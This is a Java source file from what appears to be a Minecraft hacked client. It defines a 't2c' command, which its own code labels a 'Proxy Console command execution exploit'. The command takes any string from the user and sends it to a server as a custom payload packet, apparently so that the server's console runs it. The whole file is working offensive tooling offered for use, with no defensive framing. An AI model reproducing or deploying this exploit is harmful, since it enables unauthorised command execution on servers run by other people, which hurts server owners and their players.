package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;

import net.paradise_client.Helper;
import net.paradise_client.command.Command;
import net.paradise_client.packet.T2CPayloadPacket;

import net.minecraft.class_2172; // CommandSource
import net.minecraft.class_2596; // Packet
import net.minecraft.class_2817; // CustomPayloadC2SPacket
import net.minecraft.class_8710; // Payload

public class T2CCommand extends Command {

    public T2CCommand() {
        super("t2c", "Proxy Console command execution exploit");
    }

    @Override
    public void build(LiteralArgumentBuilder<class_2172> builder) {
        builder.executes(context -> {
            Helper.printChatMessage("Incomplete command!");
            return 1;
        }).then(argument("command", StringArgumentType.greedyString())
            .executes(context -> {
                String cmd = context.getArgument("command", String.class);
                T2CPayloadPacket payload = new T2CPayloadPacket(cmd);
                class_2817 packet = new class_2817(payload);
                Helper.sendPacket(packet);
                Helper.printChatMessage("Payload sent!");
                return 1;
            }));
    }
                         }
